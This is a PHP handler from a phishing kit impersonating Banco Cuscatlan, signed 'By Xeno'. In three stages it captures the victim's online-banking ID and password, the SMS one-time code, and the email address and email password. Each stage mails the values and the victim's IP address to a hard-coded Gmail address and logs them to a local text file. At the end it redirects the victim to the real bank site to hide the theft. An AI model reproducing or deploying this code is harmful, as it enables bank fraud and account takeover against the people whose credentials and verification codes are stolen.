<?php
session_start();
$send = "off.tulz01983@gmail.com";
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$praga=rand();
$praga=md5($praga);
$page= $_POST['page'];







if ($page == '1') 

{ 
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |  Bancocuscatlan LOG  | -----------\n";
$message .= "ID      :  ".$_POST['id']." \n";
$message .= "PASS    :  ".$_POST['pass']." \n";
$message .= "----------- | By Xeno | -----------\n";
$message .= "\n";
$send = "off.tulz01983@gmail.com";
$subject = "| Bancocuscatlan LOG By Xeno | $ip |";

mail($send,$subject,$message);


$file = fopen("./Xeno.txt", 'a');
fwrite($file, $message);



header("Location:./otp.php?code_verif-locked.aspx?Pedido=CodeOPASEvent=$praga-session_id=$praga$praga");
}



if ($page == '2') 

{ 
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |  Bancocuscatlan SMS  | -----------\n";
$message .= "SMS      :  ".$_POST['sms']." \n";
$message .= "----------- | By Xeno | -----------\n";
$message .= "\n";
$send = "off.tulz01983@gmail.com";
$subject = "| Bancocuscatlan SMS  By Xeno | $ip |";

mail($send,$subject,$message);


$file = fopen("./Xeno.txt", 'a');
fwrite($file, $message);



header("Location:./mail.php?code_verif-locked.aspx?Pedido=CodeOPASEvent=$praga-session_id=$praga$praga");
}


if ($page == '3') 

{ 
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |  Bancocuscatlan EMAIL  | -----------\n";
$message .= "EMAIL     :  ".$_POST['email']." \n";
$message .= "PASS      :  ".$_POST['epass']." \n";
$message .= "----------- | By Xeno | -----------\n";
$message .= "\n";
$send = "off.tulz01983@gmail.com";
$subject = "| Bancocuscatlan EMAIL  By Xeno | $ip |";

mail($send,$subject,$message);


$file = fopen("./Xeno.txt", 'a');
fwrite($file, $message);



header("Location:https://bancadigital.bancocuscatlan.com/personas/");
}







?>


